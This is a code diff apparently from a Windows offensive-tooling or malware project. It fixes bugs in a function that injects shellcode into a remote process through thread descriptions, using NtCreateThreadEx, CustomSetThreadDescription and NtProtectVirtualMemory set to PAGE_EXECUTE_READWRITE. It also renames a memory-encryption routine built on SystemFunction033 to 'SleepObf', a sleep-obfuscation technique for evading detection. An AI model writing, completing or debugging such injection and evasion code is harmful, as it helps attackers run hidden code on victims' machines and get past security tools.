@@ -104,26 +104,25 @@ WINBOOL ThreadNameAlloc(
     //
     HANDLE hThread;
 
-    CallAde(sinner, "NtCreateThreadEx", status, 
+    CallAde(sinner, "NtCreateThreadEx", status,
         &hThread,
         THREAD_ALL_ACCESS,
-        NULL,
+        (POBJECT_ATTRIBUTES) NULL,
         hProcess,
         (PUSER_THREAD_START_ROUTINE) ExitThread,
-        NULL,
+        (PVOID) NULL,
         CREATE_SUSPENDED,
-        0,
-        0,
-        0,
-        NULL
+        (ULONG) 0,
+        (SIZE_T) 0,
+        (SIZE_T) 0,
+        (PPS_ATTRIBUTE_LIST) NULL
     );
 
-    if (hThread == INVALID_HANDLE_VALUE) {
-        DEBUG_ERROR("CreateRemoteThread: 0x%lx", GetLastError());
+    if ( NT_ERROR(status) ) {
+        DEBUG_ERROR("NtCreateThreadEx: 0x%lx", status);
         return FALSE;
     }
 
-    //
     // Set the shellcode into the thread-name 
     //
     status = CustomSetThreadDescription(
@@ -186,13 +185,13 @@ WINBOOL ThreadNameAlloc(
     CallAde(sinner, "NtProtectVirtualMemory", status,
         hProcess,
         &tempDataCall.Address,
-        &tempDataCall.Address,
+        &tempDataCall.Size,
         PAGE_EXECUTE_READWRITE,
         &oldProtection
     );
 
     if ( NT_ERROR(status) ) {
-        DEBUG_ERROR("VirtualProtectEx: 0x%lx", GetLastError());
+        DEBUG_ERROR("NtProtectVirtualMemory: 0x%lx", status);
         return FALSE;
     }
 
@@ -204,7 +203,7 @@ WINBOOL ThreadNameAlloc(
 //
 // Stack & Heap encryption - TODO: finish and try
 //
-WINBOOL TimerPastaAlPestoEPomodoro(HANDLE hProcess, LPVOID ptrRegion, SIZE_T regionSize, ULONG time, UNICODE_STRING key) {
+WINBOOL SleepObf(HANDLE hProcess, LPVOID ptrRegion, SIZE_T regionSize, ULONG time, UNICODE_STRING key) {
     TEMP_DATA_CALL tempDataCall;
     AdeSinner      sinner;
 
@@ -236,13 +235,13 @@ WINBOOL TimerPastaAlPestoEPomodoro(HANDLE hProcess, LPVOID ptrRegion, SIZE_T reg
     // Create the encryotion/decryption buffer
     //
     UNICODE_STRING buffer = {
-        .Buffer = ptrRegion,
+        .Buffer = ptrRegion, // <==
         .Length = regionSize,
         .MaximumLength = regionSize
     };
 
     //
-    // Encrypt the region-data
+    // Encrypt the region-data FIX: crash
     //
     status = SystemFunction033(
         &buffer,
@@ -264,7 +263,6 @@ WINBOOL TimerPastaAlPestoEPomodoro(HANDLE hProcess, LPVOID ptrRegion, SIZE_T reg
         regionData,
         regionSize,
         NULL
-
     );
 
     if ( NT_ERROR(status) ) {
